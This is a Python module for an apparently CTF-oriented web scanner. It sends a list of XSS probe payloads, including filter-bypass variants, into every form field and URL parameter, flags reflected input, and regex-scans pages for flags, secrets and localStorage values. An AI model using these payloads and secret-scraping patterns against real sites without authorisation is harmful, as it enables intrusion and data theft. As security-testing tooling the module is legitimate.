"""
XSS Module v2 — Also hunts flags stored in JS variables / localStorage leaks.
"""
import re
from backend.core.base_module import BaseModule
from backend.core.parser import Parser
from backend.core.flag_hunter import FlagHunter


class XSSModule(BaseModule):
    MODULE_NAME = "xss"
    DESCRIPTION = "Cross-Site Scripting (Reflected / DOM / Stored detection)"

    DETECT_PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "'\"><script>alert(1)</script>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "${alert(1)}",
        "{{7*7}}",
        "<details open ontoggle=alert(1)>",
        "';alert(1);//",
        "\"><img src=1 onerror=alert(1)>",
        "<body onload=alert(1)>",
        "'-alert(1)-'",
        "<ScRiPt>alert(1)</sCrIpT>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
    ]

    # Payloads that exfil flags via XSS (for blind XSS detection)
    FLAG_STEAL_MARKERS = [
        "TAJXSS_FLAG_STEAL",
    ]

    def run(self) -> dict:
        self.log(f"[XSS] Starting scan on {self.target_url}")
        resp = self.requester.get()
        if resp is None:
            self.results["status"] = "unreachable"
            return self.results

        # Hunt flags in raw response (sometimes flags are in page source)
        for f in FlagHunter.hunt(resp.text):
            self.add_flag(f)

        # Hunt flags in JS variable assignments
        self._hunt_js_flags(resp.text)

        forms = Parser.extract_forms(resp.text)
        self.log(f"[XSS] Found {len(forms)} form(s)")

        for form in forms:
            self._test_form(form)

        self._test_url_params()

        if self.results["status"] == "pending":
            self.results["status"] = "not_vulnerable"
        return self.results

    def _hunt_js_flags(self, html: str):
        """Scan inline JS for flag assignments, const/let/var declarations."""
        patterns = [
            r'(?:const|let|var)\s+\w*[Ff]lag\w*\s*=\s*["\']([^"\']+)["\']',
            r'(?:const|let|var)\s+\w*[Ss]ecret\w*\s*=\s*["\']([^"\']+)["\']',
            r'flag\s*[:=]\s*["\']([^"\']{4,100})["\']',
            r'FLAG\s*[:=]\s*["\']([^"\']{4,100})["\']',
            r'secret\s*[:=]\s*["\']([^"\']{4,100})["\']',
            r'window\.flag\s*=\s*["\']([^"\']+)["\']',
            r'document\.cookie.*?([A-Za-z0-9_]{2,20}\{[^}]+\})',
            r'localStorage\.setItem\(["\'][^"\']*["\'],\s*["\']([^"\']+)["\']',
        ]
        for pat in patterns:
            for m in re.finditer(pat, html, re.IGNORECASE):
                val = m.group(1)
                flags = FlagHunter.hunt(val)
                [self.add_flag(f) for f in flags]
                if not flags and len(val) > 6:
                    # Could still be a raw flag value
                    self.log(f"[XSS] JS variable value: {val[:80]}")

    def _test_form(self, form):
        action = form["action"] or self.target_url
        if not action.startswith("http"):
            action = self.target_url.rstrip("/") + "/" + action.lstrip("/")

        for field in form["inputs"]:
            if field["type"] in ("submit", "button", "hidden") or not field["name"]:
                continue
            for payload in self.DETECT_PAYLOADS:
                data = {i["name"]: (payload if i["name"] == field["name"]
                                    else i["value"] or "test")
                        for i in form["inputs"] if i["name"]}
                r = (self.requester.post(action, data=data)
                     if form["method"] == "POST"
                     else self.requester.get(action, params=data))
                if r is None:
                    continue
                # Check if payload reflected
                if payload in r.text or payload.lower() in r.text.lower():
                    self.add_vuln({"type": "reflected_xss",
                                   "field": field["name"], "payload": payload})
                    self.log(f"[XSS] Reflected on field '{field['name']}'")
                flags = FlagHunter.hunt(r.text)
                [self.add_flag(f) for f in flags]
                self._hunt_js_flags(r.text)

    def _test_url_params(self):
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        if not params:
            return
        for param in params:
            for payload in self.DETECT_PAYLOADS[:5]:
                test = {**params, param: payload}
                url  = urlunparse(parsed._replace(query=urlencode(test, doseq=True)))
                r = self.requester.raw_get(url)
                if r is None:
                    continue
                if payload in r.text:
                    self.add_vuln({"type": "xss_url_param",
                                   "param": param, "payload": payload})
                    self.log(f"[XSS] Reflected in URL param '{param}'")
                flags = FlagHunter.hunt(r.text)
                [self.add_flag(f) for f in flags]
                self._hunt_js_flags(r.text)
